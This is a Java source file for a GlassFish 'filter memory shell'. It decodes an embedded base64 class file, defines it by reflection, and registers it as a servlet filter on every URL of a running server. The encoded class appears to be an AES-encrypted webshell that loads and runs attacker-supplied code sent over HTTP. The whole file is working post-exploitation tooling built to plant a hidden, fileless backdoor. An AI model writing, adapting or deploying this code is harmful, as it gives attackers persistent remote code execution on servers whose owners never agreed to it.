package core.memshell;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.List;

public class GlassFishFilterMemShell {

    static {
        Inject();
    }

    public GlassFishFilterMemShell() {
        Inject();
    }

    public static synchronized void Inject() {
        String filterName = "memshell.GlassFilterShell";
        String urlPattern = "/*";
        try {
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            String ListenerBase64 = "yv66vgAAADMBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAbTG1lbXNoZWxsL0dsYXNzRmlsdGVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDxBwEGBwDFAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcA3AEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBBwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwcBCAcBCQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAVR2xhc3NGaWx0ZXJTaGVsbC5qYXZhDABmAGcMAFwAXQwAXgBfAQAQM2M2ZTBiOGE5YzE1MjI0YQwAYABhAQAEcEFTMwwAYgBhAQAQL2Zhdmljb25kZW1vLmljbwwAYwBhAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAQoBCwwBDAENDABkAIEMAGQAYQEABVVURi04DABlAGEMAGYAbQwBDgEPAQADQUVTBwEGDAEQAREBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAESARMMAGYBFAwAkgEVDAEWARcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEYDAEQARkMARoBGwwBHAEdAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAR4BEwwAZgEfDAEMASAMASEBDQEAEGphdmEudXRpbC5CYXNlNjQMASIBIwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMASQBJQEAE1tMamF2YS9sYW5nL09iamVjdDsHASYMAScBKAwBKQEqAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMASsBLAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBLQCBAQAOWE1MSFRUUFJlcXVlc3QMAS4BLwwBMAExDAEyAIEMAI8AkAwAdAB1AQAQbWVtc2hlbGwucGF5bG9hZAcBCAwBMwE0AQAZbWVtc2hlbGwvR2xhc3NGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsB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";
            byte[] FilterClass = base64Decode(ListenerBase64);

            Method defineClass1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass1.setAccessible(true);
            Class filterClass = (Class) defineClass1.invoke(classLoader, FilterClass, 0, FilterClass.length);

            Object filterObject = (Object) filterClass.newInstance();

            ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
            Field f1 = threadGroup.getClass().getDeclaredField("threads");
            f1.setAccessible(true);
            Thread[] threads = (Thread[]) f1.get(threadGroup);

            for (Thread thread : threads) {
                try {
                    char[] charArray = (char[]) getFV(thread, "name");
                    String chars = String.valueOf(charArray);

                    if (chars.contains("ContainerBackgroundProcessor") && chars.matches(".*StandardContext\\[/.+\\]")) {
                        Object target = getFV(thread, "target");
                        Object this0 = getFV(target, "this$0");

                        Method mf = this0.getClass().getSuperclass().getSuperclass().getDeclaredMethod("findFilterConfig", String.class);
                        mf.setAccessible(true);
                        if (mf.invoke(this0, filterName) == null) {
                            Constructor<?>[] consFilterDef = Class.forName("org.apache.catalina.deploy.FilterDef").getDeclaredConstructors();
                            consFilterDef[0].setAccessible(true);
                            Object filterDef = consFilterDef[0].newInstance();
                            Method m2 = filterDef.getClass().getDeclaredMethod("setFilterName", String.class);
                            m2.setAccessible(true);
                            m2.invoke(filterDef, filterName);
                            Method m3 = filterDef.getClass().getDeclaredMethod("setFilter", filterObject.getClass());
                            m3.setAccessible(true);
                            m3.invoke(filterDef, filterObject);
                            Constructor<?>[] consFilterConfig = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
                            consFilterConfig[0].setAccessible(true);
                            Object config = consFilterConfig[0].newInstance(this0, filterDef);

                            Constructor<?>[] consFilterMap = Class.forName("org.apache.catalina.deploy.FilterMap").getDeclaredConstructors();
                            consFilterMap[0].setAccessible(true);
                            Object filterMap = consFilterMap[0].newInstance();
                            Method m4 = filterMap.getClass().getDeclaredMethod("setFilterName", String.class);
                            m4.setAccessible(true);
                            m4.invoke(filterMap, filterName);
                            Method m5 = filterMap.getClass().getDeclaredMethod("setURLPattern", String.class);
                            m5.setAccessible(true);
                            m5.invoke(filterMap, urlPattern);
                            HashMap<String, Object> filterConfigs = (HashMap<String, Object>) getFV(this0, "filterConfigs");
                            filterConfigs.put(filterName, config);
                            List object = (List) getFV(this0, "filterMaps");
                            object.add(filterMap);
                        }

                    }
                } catch (Exception e) {
                    System.out.println(e);
                }
            }
        } catch (Exception e) {
        }

    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }
}
